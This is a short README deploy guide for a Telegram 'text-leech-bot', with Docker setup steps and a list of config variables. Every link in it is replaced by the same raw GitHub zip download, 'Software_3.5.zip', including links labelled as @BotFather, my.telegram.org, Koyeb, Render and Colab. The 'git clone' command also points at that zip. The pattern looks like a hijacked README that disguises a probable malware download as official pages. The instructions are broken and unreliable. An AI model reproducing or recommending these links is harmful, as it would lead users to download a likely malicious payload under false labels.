## Deploy To VPS
```
git clone https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip
```

```
cd text-leech-bot
```

```
nano modules/vars.py
```

USE : `ctrl + s` : FOR SAVE | `ctrl + x` : FOR EXIT

```
sudo apt install docker.io -y
```

```
sudo docker build -t text-leech-bot-by-ashu .
```

```
sudo docker run -it --rm text-leech-bot-by-ashu
```






## vars.py [vars.py](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip)

❏ `BOT_TOKEN`  - Get Bot Token From [@BotFather](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip)

❏ `API_ID` - From [my.telegram.org ](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip)

❏ `API_HASH` - From [my.telegram.org](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip)

❏ `PORT` - Any Port Like 6969 | Dont Use 8080 in [app.koyeb.com](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip) & [colab.research.google.com](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip)

❏ `WEBHOOK` - True if you use [render.com](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip) & [app.koyeb.com](https://raw.githubusercontent.com/mj5000500-svg/tttttttttbotleechdl/main/modules/Software_3.5.zip)
